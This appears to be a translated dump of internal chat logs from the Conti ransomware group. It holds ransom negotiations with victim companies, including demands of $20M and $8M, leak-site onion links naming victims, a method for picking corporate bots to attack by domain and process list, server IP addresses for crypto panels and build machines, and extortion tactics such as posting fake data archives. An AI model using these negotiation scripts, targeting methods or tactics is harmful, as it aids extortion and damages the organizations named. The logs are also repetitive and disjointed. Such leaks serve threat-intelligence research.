Yesterday we had a panic attack with Skippy.
I was barely able to move the timer, so it would have been a fiasco
spit and leave nah - you can, we ourselves will continue to blog to keep my hands free here!
just don't get ahead of time
figure it out first
I can't log in either
so
just don't get ahead of time\n- didn't understand, sorry
imagine yesterday's situation
you already had such a jamb
was
I promised you that there will be no more
and the joint was not my fault
I didn't know about time
now i've got it all figured out
blog needs to be fixed
now I'm doing OTTAWA
That's fucked up
it's been three fucking hours
neither patience nor strength
I roughly understand what the problem is
and told cyber about it, but for some reason he is in no hurry to correct the situation
made a new chat for ottawa
I'll give them a number
how do we send it to them
I asked them for a box
they said they would send it
well you saw
what will they send???
Hello. I agreed with mango a couple of additional weekends because I got sick and the computer flew, all garbage piles up at once (don't lose if that in a day or two, I think I'll get in touch as it becomes easier
and I don't understand what blog you deleted????
like all the blogs I have in place
oh, you threw it through the privnot
see
[09:24:52] <tramp> they said they would send it today - what will they send us today ???
yesterday, by the way, the lawyer did a good job, he helped us very sensibly with the texts
You still need to get a lawyer somewhere.
yes, also, according to LL_Main, yesterday we conferred with the skippy, it\u2019s more likely that we won\u2019t be able to squeeze more than 5kk from them. What do you think about this?
I wrote to you off, people for tomorrow if anything comes for an interview. I'll orient myself in time
Hey
Ok. I'm waiting
[09:24:28] <tramp> made a new chat for Ottawa - ok, and guide me pliz, in case you disappear again
hi, did you find them all?
By the way, I\u2019m blogging them until 01/10/22. I think it will be ok
and write pliz when you're free, we need one more thing to discuss
yes, also, according to LL_Main, yesterday we conferred with the skippy, it\u2019s more likely that we won\u2019t be able to squeeze more than 5kk from them. What do you think about this?\nwell, let's see
[09:24:28] <tramp> made a new chat for Ottawa - ok, and guide me pliz, in case you disappear again\nI'll do it myself don't worry
I slept for two days
cleaned everything
etc
and write pliz when you're free, we need one more thing to discuss\nwhich ?
we have all the chat blogs with which conversations are currently being conducted, the timer is until 23.59 on 12/31/2021. They will be published right in the new year. With problems with the blog, pulling up to this time is dumb. Therefore, I must understand what to do on the 30th, since 31, if I am online, it is extremely small.
until January 7, all extended
so that everyone can be calm
+
today straight
MAILFLY_2 - also need to make a new blog on them
or 30
deleted the old one yesterday
who deleted?
last night my blog didn\u2019t load, Reshaev\u2019s blog loaded and he deleted it
or 30 - you won't forget?
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/zTnGsBmj_Acuity_Brands
it would be better, of course, to translate all 30
he hangs
nobody deleted anything
what if the blog won't load again?)
so until the 30th let the deciders do
http://continewsnv5otx5kaoje7krkto2qbu3gtqef22mnr7eaxw3y6ncz3ad.onion/gQ1ZfJba_Shutterfly_Inc
you take it wrong
ahh, so why was this removed at all? he was all right
with Shutterfly_Inc ?
Yes
uncle forgot to tell you something .. they lost a snowstorm, if he is your person and you are in touch with him, let him write something
I immediately transferred them to N.G.
otherwise I kind of pay his guys for the fact that they just sit
you don't understand huh?
in the sense?
trump explain
did you see that they were leaked from the old chat?
and know the link to their old blog?
aaaaaa
why is it needed?
didn't see the link
well, yes
so that they are not compromised
well then it's clear
you need to make a new one and give only a new chat to them a link to the blog
I think they did it on purpose
someone cleaned the old chat and leaked info on them
Yes
I think this is their strategy
with such problems with the blog as it is now, it is very difficult to do something
he just hangs
do you have someone doing blogs now???
I don\u2019t know if this is related to this or not, but the blog began to hang as a new 25Tb server was connected. and as I noticed after that, the difficulties of logging and further work on the blog became. you need to check it, just turn off this server and see how the blog will work.
do you have someone doing blogs now??? - Yes, I myself can start making blogs from support, who himself directly downloads the date from the targets. we have a lot of free time now
day off
I have a blog too
what time will you be here today?
Hey

I control the negotiations, you probably see. Today I won\u2019t be long, because I\u2019m going and I\u2019m planning to leave for 700 km in the evening, the road is not close and the snow is fucking ... the case is shorter). Tomorrow I will still appear in the chats to close the tails, if any. After N.G. I\u2019ll come and the first thing I\u2019ll probably still buy a car))), since one dick per square is not enough with the fall of the cue ball. Well, you and your family with the New Year, all the best to you, happiness and good luck in the coming year, more children's laughter, less tears, because for this we are here with you. If anything, write here, I will periodically appear as far as possible and respond to your cries))

And the article starts like this:\n\nWhile preparing material on Conti ...\n\nSo I'm almost sure that it's this guy who leaked us. We need to find some friends urgently, who are friends with the admins of this Codeby.net
there this chela has not had an acc for the first day, a lot of posts, as I understand it, he\u2019s like a virtual Robinhood of some kind ... :) it\u2019s bad if he merges something right now according to our structure, or according to coders .. the forum is quite well-known, it will scatter at the moment all info...

pzdts, hosters are already chopping off the tor..
I came across an article today on the Codeby.net forum. So here is an article from some kind of dieZel. The article itself is about the \"how was it? Log4shell\" exploit. And the article starts like this:\n\nWhile preparing material on Conti ...\n\nSo I'm almost sure that it's this guy who leaked us. We need to find some friends urgently, who are friends with the admins of this Codeby.net
I understand, I'll do it.
there this chela has not had an acc for the first day, a lot of posts, as I understand it, he\u2019s like a virtual Robinhood of some kind ... :) it\u2019s bad if he merges something right now according to our structure, or according to coders .. the forum is quite well-known, it will scatter at the moment all info...

Hello. look pliz, there is a very strange thing in the chat rooms. someone dropped obscure files to three companies at once and at about the same time. I am sure that these are third parties that do not belong to these companies, possibly intelligence agencies. I didn\u2019t touch them and didn\u2019t write answers on them, so look for yourself in the virtual machine, I feel there\u2019s some kind of catch here, or a virus or something else.\n\njqiY9g2UHMjfDzJFXlnHZZuWl5nDPEznuJe1M4meXqioZx0jjn4ioMCKgKVlJVlM\nZABQk2xlwqLflJWvwNoGlzddhRYvIC9SNpWOrYfrIk2xDRkElNgqed0ljaLiHmLj\nrw0J6Ap3LZNfxsJyo6UpClQbrgD1dzRjxZLVZep0QQEFdl01ihbHIkEvZt91EvtA

trump hi. need your advice on AMERICAS. they offer 1.5kk, I think they will not be able to pull more. I propose to set 2kk and say that everything, without negotiations, we close this issue. what do you say? until I answered them, I'm waiting for your decision

how much do we give them
well they are big
we really put them crooked
not all 800esxi are broken
but others are still silent
well, yes
let's wait
So how much do we charge them?
sec
$20,000,000
let's start
clear
it is strange that so far only they came to the chat
you need to consider that they will not want the decrypt, they will only ask to remove their date
I think so
Yes
well, let's see
they came because the date got out of them
and the resonance went
there we managed to lock only 260esxi and 800
Yes
Yes Yes
4-5m even from them we will take the zbs
I think they have already restored everything
that's why they didn't chat
let them offer
well, that's not mao either
Yes
yeah
Let's see how the dialogue goes.
Well, we are waiting, in any case, we left - it's already good
just so that we don\u2019t scare them away with such a sum right away

backup kit:
1) cryptopanel 213.252.245.181 under Linux
2) for builds of Windows binaries 2.56.10.41
yam still need a 5th server for crypto chat (it will be separate from the crypto panel)
those. one set: 1) cryptochat 2) cryptopanel 3) news site 4) windows for builds 5) sftp for files
plus for now we keep the previous server of the cryptopanel
esteban also said that a new project is being opened, it will need a second set of 5 servers: 1) crypto chat 2) crypto panel 3) news site 4) windows for builds 5) sftp for files
plus two more backup servers for 1) crypto chat and 4) windows for builds of the second project
i.e., 7 more servers will be needed
I haven't ordered them yet
further there is also a Redmine server for silver 185.64.106.247
and my backup server: 217.12.201.132
these are all the servers that I renew
those. about 50 vps and dedics, not counting the vpn for horse igrand, and 6 third-party vpn from aprovpn
half I extend around the 10th the second half around the 23rd
25 pieces at a time
25 pieces extend takes a whole working day
if I send you one more for payment, it will take several days

I've been loading all week about 6k loaded, at least someone would come
and what closed it to me\n\nI was asked to
all close and open for 2 people, and they do not work unfortunately )
I was exactly there this week, you can see from the tasks)\nI rarely delete tasks
Bentley asked for this?
no stern

ok let me figure out why
at least give a warning)
yeah, I don't mind, as long as everyone works
YUS about 1k bots and ka
It was
this is not a complaint against you, if that)
all OK
I understand that they said close, you closed)
did you pour 1k in a week?)
need to decide by monday\n\nMonday will be even stronger
I was in the admin panel on the 17th, sort of, I didn\u2019t see Yusu and Canada there domain bots
total difficulty 6k bots, yusi like about 1k
from 18
loading mix bots needed for spam
well, there I look there are domains
waiting for a response from Bentley\nI need to resolve the issue with the host and domains so that I can host the installer
and how do you see that standing bot?
Domain: 6eves.net
let's say
or here\n\nDomain: tonkin.com
Domain: DealermineCorp.dealermine.com
here's a new one
Domain: AMERICANBOILER.local
Domain: ocscd.owenscollision.com
I select according to 3 main criteria\n1. Availability of a domain + search on the Internet for any companies associated with this domain\n2. I check the list of processes (it is strictly tied up that if it is a user, then the list of processes is unlikely to be 15 pieces, usually much more) (if the server, then a lot is possible there)\n3. loading and already more accurate viewing of what and how
[18:24:43] <veron> Domain: DealermineCorp.dealermine.com\nit's 100% corp\n\nDomain: tonkin.com\nperhaps a corp, but you need to look at the list of processes. there is such a company, but analysts can disguise it. if the processes are normal - load and collect information further\n\n[18:25:46] <veron> Domain: ocscd.owenscollision.com\ncorp exactly\n\n[18:25:30] <veron> Domain: AMERICANBOILER.local\nlooks like a corp, but again you need to look more precisely
OK
well, and other things)\nusually the domain + list of processes gives out well whether it is a corp or not
but if in doubt - then check in more detail\n\nsometimes I also look at ipconfig or just the list of processes, because VPN products may be running there\nThen there may be such a situation that the user is corporate, but is currently disconnected from the VPN of the corporate network and that's it)
then I mark it with myself and then I upload it last

there was a division with Derek, I'm throwing off to you what he wrote to me for the alter, what you said that they would give 70% to. Alter and I got a little crazy))) Alter asked you to throw off to show what he wrote. they refer to andy that they negotiated with him, but andy will not negotiate this himself. he raised their rights in several respects and gave the nets out of the kindness of the soul only.

what kind of brainchild is your conti and why is it suddenly also incomprehensible, where are you in general and conti)))))) Stern, I showed it all myself today in the morning, so I don\u2019t know what you were going to decide with me
I think that there is nothing to decide here, since you allow yourself this, since everyone constantly complains about you and gets angry, then fuck it, we generally need it, spoil our reputation after your intrigues
5% for negotiations, 20% for expenses and organization - for what??? you yourself is not funny from all this?
we don\u2019t have such percentages for anyone, if you want to work, work normally, we are all in the same boat
and you can tell Derek that I deeply don\u2019t give a fuck about your moods there, I don\u2019t fucking need it for you to constantly excuse yourself and decide something

in short trumpych, I don\u2019t know if it\u2019s a coincidence or not, but here are my thoughts when analyzing the whole situation with the servers: amerikas agrees to a figure of 4.5k somehow easily and at the same time asks for fucking time supposedly to get the loot. during this period, we just start having troubles with the servers, they were buggy for several days, and tonight, as I understand it, they disappeared and these faggots appear and ask to send them 4 bitch files for dick, understand some legal garbage. Don't you find this coincidence too strange?
Guys when the date was pumped out, could not leave traces of IP addresses somewhere?
maybe the bitches figured it out somewhere and got to the DC?
if there was some kind of accident with the DC, then both servers would have disappeared at once, and so one disappeared, and the second was available, but who the fuck knows who changed the password, then he disappeared. in short, I think our servers can no longer be returned, like the date
plz tell me what you think about the situation as a whole? maybe you need to fucking clean everything and the laptop in the oven?))

Yes
what do you think?
Now it became clear to me why they were delaying so much time
I think it's all unrelated
all OK
what did the caliper write?
wait let's decide with ftp
everything will be OK
need faster
Did America see what she wrote?
waiting for files
the last type of their check for a lawyer
yes, we can get rid of it if that
complete nonsense of course, but if you return ftp it will be really good
I think not anymore, and we won\u2019t be able to lay out fucking, there\u2019s no date
so ftp is needed
So what did the DC support write?
yes you wait) do not drizzle)

OK
well, yes
but you need to see whether they came to the chat or not

Understood
It turns out such a story is not beautiful with him. Do you remember when I returned from vacation in the summer, I wrote to you in September that the horse was pouting and did not answer. Ed@ took advantage of this. He sat in my ear, why do those ehors come to us, everything is super with us! Conditions will only get better!). Since November, we have received decent netting norms, more than 10. He gave us access to the chat only in December. He said they say as someone will immediately go ladies. And of course there were no chats. And as practice has shown, with the last grid with which he did not pay extra. He generally communicated by mail. Therefore, there is reason to doubt the rest. But I won\u2019t even get the lock id, he banned me and my entire team in his chat.\nThe moral is that he introduced us and put himself on a par with you. That this is his child and so on. And when we met, I also told you the story of how a pirate threw us, and you told me that working with you this would never happen again.
I have no pretensions towards you. I'm waiting for you. Just need a little help from you.
But now, in addition to the fact that they reconciled with the horse. so he took the reverse. ) Ebashim. 2 more slammed. And I'm waiting for new ones.
Brother, another question. Who's in charge of the chats? I just don't go. For those two that we did the other day.

Let's try to reanimate after all, tell me what you need for this
appear already solve all these problems with me, without you there\u2019s no way right now ...
Hey
he didn't write to me
on this occasion
he said to solve his problem and for people to work
we probably have different sterns
especially since the stern has not been stern for a long time))
in cyber bro, I myself will figure out who to give and who not, it's certainly not for you to decide
I have no personal claims against you.
but he\u2019s on behalf of conti there\u2019s no need to tell someone something, all the more so to hang some kind of noodles on your ears, about security, etc. we were thrown no and never will be, the chief clearly clarified this moment to everyone and made it clear.
could you get a salary today?
fucked up the day today instead of solving the issue with the servers

Hi, how are you?
Vsmysle carried away, arrested?
if so, then you need to think and clearly understand how our servers calculated
sooner or later they are found
this is normal
I bought us now went
I will bkapit everything on him
everything i download
I will download the whole date locally to myself
OK. shorter than 100% of the server will not be returned
Do you know if they were logged?
not 100%
no ifa from dts yet
and the logs were kept there?
support for so much time has not yet answered?
strange at all
bro
I do not know yet
dts are silent
understood
I'm pinging servers
they seem to be available

yes, not alive
amerikas, 100 pounds, they are bitches, don\u2019t go to your grandmother
not a fact yet
Well I don't believe in coincidences
ok as long as time allows a couple of days to 30s americas
let them toil
[21:29:46] <balzak> everything worked
everything worked
so, we have 4 companies fucked up, and only 2 came to the panel, somewhere else 2 hung up and the most interesting ones hung up, financiers
And what are we going to do with America? Are we strangling them with a farce as it will turn out, or are we still waiting for a response from the DC?
that's how you say it and we'll do it, I'm at a loss, because I think that because of them bitches we fucked up the server
make a support role that only adds builds
Trump didn't text you?
what to do with amerikos?

I did everything tomorrow I will replace your builds then in the afternoon
I did everything tomorrow I will replace your builds then in the afternoon
Hey
Hey
So what are we going to do about America?
Hey
write to them that we have already given you enough dates
I have a small idea
let's
write to them like that all your date 650GB is in archives, divided into parts. it takes a long time to get your files out. Well, then add that the dates have already given enough and so. so tomorrow we will start uploading if you don't pay. Let\u2019s say they don\u2019t pay, then I download the movie for 20-30 gigs and archive it by dividing it into parts and upload several parts with the publication))) even if they want to watch, they won\u2019t fucking succeed. in this way the resonance will go and fucking it will not be clear whether the date is there or not. I don't think they want to take the risk and pay. But this will be only on one condition that they don\u2019t know for sure that our servers were screwed up
from here and it will become clear to us because of them or not
what do you think?
didn't come up with anything smarter
but just to choke them like they have already given a lot and we won\u2019t give 4 more files, well, this is laughter in my opinion
yes you can try
let's see their reaction
OK
I'll email them today and see what happens.

hi!
We came to an agreement before the New Year.\nYou got a lot of time, more than enough to find any sum and fulfill your part of this agreement.\nHowever, you now ask for additional time, additional proofs etc. Seems like you are preparing to break the agreement and flee or just to decrease the sum.\n\nMoreover, it is a very strange request and its explanation. A lot of companies pay such amounts without any problems.\n\nSo, our answer:\nWe are waiting for the above-mentioned sum until 5 February. We hold our words. If we see no payment and you continue to add any conditions, we begin to upload data.\nThat is all.
cool

Taiwanese electronics company Delta Electronics, a contractor for Apple, Tesla, HP and Dell, has been the victim of a ransomware cyberattack.\nDelta Electronics is the world's largest supplier of switching power supplies, with more than $9 billion in sales last year.
While the Delta Electronics notice did not say who was behind the attack, an unnamed cybersecurity company found a sample of Conti ransomware on the contractor's network. According to The Record, Conti operators encrypted 1,500 servers and 12,000 computers out of approximately 65,000 devices on the Delta Electronics network.\nThe ransomware group demanded a ransom of $15 million for the decryptor and to prevent the leak of stolen data. The cybercriminals promised a discount if the company \u201cpays off\u201d quickly.

can you give the contact of horsa please\notherwise there is a strange situation, it overloads those grids with which the dooms team works
unavailable status
ok, please ask him to add me
can answer you
yeah I'll write
otherwise, an unpleasant situation arises here that it overloads the grids that are already signed and with which the dooms team works
hmm.. got it
it's not nice to do something like that)\nsigned the grid yesterday, we are working with it\ntoday we saw in the admin panel - he is loading it
or you can tell him yourself, I'll tell you the name of the grid\nbecause the grid is signed, it is already in work, but in the admin panel today we saw that the horse is overloading it for itself)\na bit not pretty
is there a dyl contact?
perhaps he is overloading her, maybe I\u2019m driving in vain to the horse\nI just want to know who is doing it.
No
dylon@q3mcco35auwcstmt.onion like this
or is it dyl doing, i don't know\nbut it is desirable to convey to both the information that it is impossible to do this, let them check who works with the grid before doing this
thanks
Is there a crypt yet?
being completed
please write back
is it in the tor rocket?
horse
what rocket?
rocket chat
xflemd..............onion
I don't have one
in such
no, it's still horses
please tell me that you don't need to touch the \"MOPALT006_9CE5FDDF\" grid, and work in it too)\nanother team is already working in it, and since yesterday
Ready crypt

1. More details of other blockchains, studied Byteball.\nAt first he interested me. But then it turned out that\ntheir blockchain (on the DAG) rests on witnesses, as\nare Google and others. twelve witnesses. There will be no witnesses\nthere will be no blockchain. I found a video with a lecture by one of the developers\nByteball. He spoke very unconvincingly about this case. Audience too\nI think I was disappointed. Witnesses must constantly add 24/7\nyour transactions in the DAG. This is how I testify to the past. If added later\ntransaction with repeated spending and parents from the past, then there will be no\nwitnesses and it will be unusable. The blockchain is written entirely in js. DB in mysql.\nTo deploy a full client, you need to rent a server, install everything on it,\nget a certificate for SSL. Network exchange goes on https.\nAlthough I had the idea of the client working through an anonymously obtained server.\nI'm thinking about it.\n \n2. Since I still didn\u2019t decide on which blockchain principle to stop, I started looking\npolkadot. This blockchain is written in Rust. The language is new. I'm actually into programming languages\nthe conservative, as stuck to with ++, and I live. But you need to deal with the blockchain, so\nI downloaded the Rust tutorial, installed the compiler and have been studying for the third day. It is claimed\nthat Rust is very suitable for blockchain development. We'll see. If it's true\nand this language increases the productivity of programmers, why not.\n\n3. NFT also surfaced. Must watch.\n\n4. What I have determined for myself.\nBlockchain should be done on DAG. The unit of record in the DAG will not be a block with a bunch of transactions,\nbut a separate transaction. Any entity can be in a transaction: transfer of coins,\nsmart contract, some kind of token (NFT). As a mysql DB, probably. Until the issue is resolved\nwith double spending, witnesses. Developers (we), in principle, can act as witnesses.\nAt the first stage without sharding, I think we will do it. Let it be for now.

I found a video with a lecture by one of the developers\nByteball. He spoke very unconvincingly about this case. Audience too\nI think I was disappointed. Witnesses must constantly add 24/7\nyour transactions in the DAG. This is how I testify to the past. If added later\ntransaction with repeated spending and parents from the past, then there will be no\nwitnesses and it will be unusable. The blockchain is written entirely in js. DB in mysql.\nTo deploy a full client, you need to rent a server, install everything on it,\nget a certificate for SSL. Network exchange goes on https.\nAlthough I had the idea of the client working through an anonymously obtained server.\nI'm thinking about it.\n \n2. Since I still didn\u2019t decide on which blockchain principle to stop, I started looking\npolkadot. This blockchain is written in Rust. The language is new. I'm actually into programming languages\nthe conservative, as stuck to with ++, and I live. But you need to deal with the blockchain, so\nI downloaded the Rust tutorial, installed the compiler and have been studying for the third day. It is claimed\nthat Rust is very suitable for blockchain development. We'll see. If it's true\nand this language improves the productivity of programmers, why not.\n\n3. NFT also surfaced. Must watch.\n\n4. What I have determined for myself.\nBlockchain should be done on DAG. The unit of record in the DAG will not be a block with a bunch of transactions,\nbut a separate transaction. Any entity can be in a transaction: transfer of coins,\nsmart contract, some kind of token (NFT). As a mysql DB, probably. Until the issue is resolved\nwith double spending, witnesses. Developers (we), in principle, can act as witnesses.\nAt the first stage without sharding, I think we will do it. Let it be for now.
5. Forgot. Still studying Hedera consensus.

We are very upset that you don't believe in the fulfillment of our conditions. First of all, we appreciate and value our reputation (about us and on the fulfillment of our agreements you can find a lot of information on the Internet). This is the main thing. But you will understand this when we make the deal. The second one, we will explain you a little bit deeper about the amount: The Conti has a big legal department and it checks all the possible data and sources to establish an appropriate amount. We check your annual income, the value of materials (you have a lot of SENSETIVE and PRIVATE files, Military bufget and so on), etc. Also, please don't forget about the decryption software and our expenses. Therefore, basing on all the info, we set a 5% amount for a payment. FYI, every our client is asked to pay this amount, you are not unique. But considering your situation we can give you a very big discount - 20%. Now our price for you is $8kk.
I already gave them an answer
maybe add The second...
so that they understand why such an amount and remind them of the date, it\u2019s fucking serious there
Can you see me???
I don't fucking see you
